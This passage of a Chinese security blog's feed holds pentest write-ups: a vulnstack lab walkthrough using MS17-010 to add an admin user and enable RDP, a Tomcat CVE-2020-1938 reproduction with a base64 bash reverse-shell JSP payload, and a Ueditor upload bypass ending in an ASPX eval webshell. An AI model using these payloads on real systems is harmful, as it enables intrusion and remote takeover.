class="hljs-keyword">Name</span>     <span class="hljs-keyword">Current</span> Setting  <span class="hljs-keyword">Required</span>  Description   <span class="hljs-comment">----     ---------------  --------  -----------</span>   SRVHOST  <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>          yes       The address <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>   SRVPORT  <span class="hljs-number">1080</span>             yes       The port <span class="hljs-keyword">to</span> listen on.Auxiliary <span class="hljs-keyword">action</span>:   <span class="hljs-keyword">Name</span>   Description   <span class="hljs-comment">----   -----------</span>   Proxy  msf auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run[*] Auxiliary <span class="hljs-keyword">module</span> running <span class="hljs-keyword">as</span> background job <span class="hljs-number">0.</span>[*] <span class="hljs-keyword">Starting</span> the socks4a proxy <span class="hljs-keyword">server</span></code></pre><p>然后打开/etc/proxychains.conf（原始端口是9050，改为我们设置的1080）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>测试一下可以成功访问192.168.52.0网段</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-2拿下第二台主机"><a href="#4-2拿下第二台主机" class="headerlink" title="4.2拿下第二台主机"></a>4.2拿下第二台主机</h3><p>扫描一下VM2（192.168.52.141）proxychains nmap -p 1-1000 -Pn -sT 192.168.52.141</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开放了445端口，所以利用<code> use auxiliary/scanner/smb/smb_version</code> 可以扫描系统版本，扫描结果是<code>win2003</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>使用<code>ms08-067</code>打一下，发现打不了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>开始尝试<code>ms17-010</code>，使用<code>auxiliary/scanner/smb/smb_ms17_010</code>对52这个段进行扫描，发现三台主机都存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>利用<code>exploit/windows/smb/ms17_010_psexec</code>对<code>192.168.52.141</code>进行攻击，发现没办法弹回shell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>发现可以使用<code>auxiliary/admin/smb/ms17_010_command</code>来执行一些命令且是系统权限。</p><pre><code class="hljs shell">use auxiliary/admin/smb/ms17_010_commandshow optionsset rhosts 192.168.52.141set command &quot;net user ice Aa123456 /add&quot; #添加用户exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &quot;net localgroup administrators ice /add&quot; #管理员权限exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/31.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><pre><code class="hljs shell">set command &#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;exploit #成功执行</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/32.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>然后使用<code>proxychains</code>连接他的3389，<code>proxychains rdesktop 192.168.52.141</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/33.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h3 id="4-3拿下域控"><a href="#4-3拿下域控" class="headerlink" title="4.3拿下域控"></a>4.3拿下域控</h3><p>pass</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note note-success&quot;&gt;
            &lt;p&gt;关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧&lt;/p&gt;
          &lt;/div&gt;

&lt;h2 id=&quot;一、环境搭建&quot;&gt;&lt;a href=&quot;#一、环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一、环境搭建&quot;&gt;&lt;/a&gt;一、环境搭建&lt;/h2&gt;&lt;h3 id=&quot;1-1环境搭建测试&quot;&gt;&lt;a href=&quot;#1-1环境搭建测试&quot; class=&quot;headerlink&quot; title=&quot;1.1环境搭建测试&quot;&gt;&lt;/a&gt;1.1环境搭建测试&lt;/h3&gt;&lt;p&gt;最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。&lt;/p&gt;
&lt;p&gt;靶场下载地址：&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&quot;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg&quot; alt=&quot;ATT&amp;amp;CK实战系列——红队实战（一）&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="红队实战" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/"/>
    
    <category term="内网渗透" scheme="http://www.secice.cn/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</title>
    <link href="http://www.secice.cn/p/933884b8"/>
    <id>http://www.secice.cn/p/933884b8</id>
    <published>2020-02-22T08:43:33.000Z</published>
    <updated>2020-12-13T11:14:24.739Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h3><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h3 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h3><ul><li><p>目标机器开启AJP Connector 服务端口（默认开启，为8009端口）</p><a id="more"></a></li></ul><h3 id="0x03-文件读取-amp-文件包含RCE"><a href="#0x03-文件读取-amp-文件包含RCE" class="headerlink" title="0x03 文件读取&amp;文件包含RCE"></a>0x03 文件读取&amp;文件包含RCE</h3><ul><li>文件读取</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 192.168.52.130</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/01.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>文件包含</li></ul><pre><code class="hljs shell">py -2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 192.168.52.130</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/02.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><ul><li>test.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;ping mdd7e.dnslog.cn&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><h3 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h3><ul><li>shell.txt</li></ul><pre><code class="hljs java">&lt;%        java.io.InputStream in = Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjE0My84OTg5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>).getInputStream();        <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;        <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;                out.println(<span class="hljs-keyword">new</span> String(b));        &#125;        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);%&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20200222_Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-1938%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%89/03.jpg" alt="Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="http://www.svenbeast.com/post/fqSI9laE8/">http://www.svenbeast.com/post/fqSI9laE8/</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-漏洞影响&quot;&gt;&lt;a href=&quot;#0x01-漏洞影响&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞影响&quot;&gt;&lt;/a&gt;0x01 漏洞影响&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Apache Tomcat 9.x &amp;lt; 9.0.31&lt;/li&gt;
&lt;li&gt;Apache Tomcat 8.x &amp;lt; 8.5.51&lt;/li&gt;
&lt;li&gt;Apache Tomcat 7.x &amp;lt; 7.0.100&lt;/li&gt;
&lt;li&gt;Apache Tomcat 6.x&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0x02-前提&quot;&gt;&lt;a href=&quot;#0x02-前提&quot; class=&quot;headerlink&quot; title=&quot;0x02 前提&quot;&gt;&lt;/a&gt;0x02 前提&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;目标机器开启AJP Connector 服务端口（默认开启，为8009端口）&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://www.secice.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Tomcat" scheme="http://www.secice.cn/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>佛学的魔改.net Ueditor</title>
    <link href="http://www.secice.cn/p/256d1eb"/>
    <id>http://www.secice.cn/p/256d1eb</id>
    <published>2019-12-11T01:19:25.000Z</published>
    <updated>2020-12-13T11:15:36.777Z</updated>
    
    <content type="html"><![CDATA[<p> 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。</p><p>网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。</p><p>翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg" alt="佛学的魔改Ueditor"></p><a id="more"></a><p>通过fd抓包获取到编辑器路径为：</p><p><code>https://xxx.xxx.com.cn/crm9000/HtmlControl/ueditor1.4.3.3/</code></p><p>果断用exp去打，结果访问漏洞地址的时候，发现404。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/02.jpg" alt="佛学的魔改Ueditor"></p><p>查看上传功能，发现上传功能也无法正常使用，提示后端配置项无法正常加载。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/03.jpg" alt="佛学的魔改Ueditor"></p><p>查看配置文件，感觉也没有问题呀，此时有点郁闷。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/04.jpg" alt="佛学的魔改Ueditor"></p><p>在牧马大佬的提示下，仔细查看js和流量。首先查看js，发现此处加载了一个Add.js文件。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/05.jpg" alt="佛学的魔改Ueditor"></p><p>打开这个js文件，找到了ueditor的真实路径。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/06.jpg" alt="佛学的魔改Ueditor"></p><p>但是去访问的时候，发现地址无法访问。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/07.jpg" alt="佛学的魔改Ueditor"></p><p>通过查看加载编辑器时的网络包，可以看到这也是后端配置项无法正常加载的原因。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/08.jpg" alt="佛学的魔改Ueditor"></p><p>然后尝试直接拼接编辑器路径到域名上，发现访问成功，原来是开发配置得有问题，多加了端口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/09.jpg" alt="佛学的魔改Ueditor"></p><p>既然能够正常访问，那我就不客气了，拿exp干他，先在服务器上丢个aa.jpg的一句话马。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/10.jpg" alt="佛学的魔改Ueditor"></p><p>上传成功，返回的路径为：<code>upload/image/201912/11/6371165485276351045218627.aspx</code>（记住这个该死的路径，等下要懵逼。）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/11.jpg" alt="佛学的魔改Ueditor"></p><p>接下来就是寻找路径了，我tm找了半个多小时呀，拼接了各种路径，都没找到。。。</p><p>后来实在无奈，继续去查看配置文件，看到配置文件的时候，人是懵逼的，路径是对的呀，但感觉总有哪里不对劲。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/12.jpg" alt="佛学的魔改Ueditor"></p><p>然后不信这个邪，又重新上传了一次，发现此时返回的路径是</p><p><code>upload/image/20191211/6371165520599596974371346.aspx</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/13.jpg" alt="佛学的魔改Ueditor"></p><p>仔细一看，第一次返回的路径中多了’/‘，感情是服务端返回了一个假路径给我，难怪配置文件看着哪里不对劲，原来是路径规则。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/14.jpg" alt="佛学的魔改Ueditor"></p><p>但是访问shell的时候，报了一个错，第一次遇到这种问题。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/15.jpg" alt="佛学的魔改Ueditor"></p><p>直接在aa.jpg里面加上<code>&lt;head runat=&quot;server&quot; /&gt;</code>，再上传，浏览器访问的时候就正常了，但是菜刀连接的时候，又报了这一堆东西（同事复现的时候，菜刀直接连接成功，佛学）。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></code></pre><p>继续把这些加到aa.jpg内容里，最后，aa.jpg内容为：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/default/default.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/EnStyle.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../../../../../../App_Themes/green/Style.css&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;g&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>上传成功后，菜刀连接成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/16.jpg" alt="佛学的魔改Ueditor"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt; 前几天在驻场时候遇到一个套娃的站，一个站里面套了N多个站，域名相同，根据不同的子目录进行区分，由于现在已经修复了，只能尽量还原当时的场景来写这文章。&lt;/p&gt;
&lt;p&gt;网站上传点对上传的文件进行了二次渲染，此处无法绕过，只能寻找其他突破口（因为套了不少站，浪费大量时间）。&lt;/p&gt;
&lt;p&gt;翻功能的时候，在一个站点找到这么一个编辑器，是不是很眼熟。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191211_%E4%BD%9B%E5%AD%A6%E7%9A%84%E9%AD%94%E6%94%B9Ueditor/01.jpg&quot; alt=&quot;佛学的魔改Ueditor&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="原创文章" scheme="http://www.secice.cn/categories/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="渗透实战" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
    <category term="原创文章" scheme="http://www.secice.cn/tags/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>记一次任意文件上传</title>
    <link href="http://www.secice.cn/p/edc6b9c0"/>
    <id>http://www.secice.cn/p/edc6b9c0</id>
    <published>2019-11-27T09:06:13.000Z</published>
    <updated>2020-12-13T11:15:37.953Z</updated>
    
    <content type="html"><![CDATA[<p>很久没发文章了，一个是因为忙，另一个就是不知道发什么，这次遇到一个上传觉得挺有意思的，就分享一下思路。<br>在客户现场驻场遇到的站点，我们乙方在挖洞的同时，甲方也有十多个人在同步挖洞。我们少挖到洞还要找我们麻烦，欲哭无泪，太难了。<br>当时通过另外一个漏洞getshell，还在暗自高兴的时候，翻目录的时候，看到一个TempFile的目录下有个名为shell.aspx的文件，文件上传时间在目标给我们的前几个小时（客户在给我们目标前，就让甲方的渗透人员先测试了），此时的我笑容逐渐消失，意识到问题的严重性。</p><a id="more"></a><p>看到TempFile的目录，猜测是通过上传功能上传上来的。然后在后台找了许久，还好功能不多，找到了上传的功能点（之前这个功能点因为浏览器不兼容的原因，无法使用，后来使用ie才能够正常使用）。</p><p>上传点在一个上传附件的地方，上传图片，拦截到此数据包发送到repeater模块。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="20191127记一次任意文件上传"><br>修改数据包，可以发现上传成功，但是并不知道真实路径，文件的访问路径为：<a href="http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b">http://xxx.com:port/File/DownLoadFile/22c84d83-d9cf-dd7b-0dd1-ea72ddddd18b</a>。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20191127_%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" 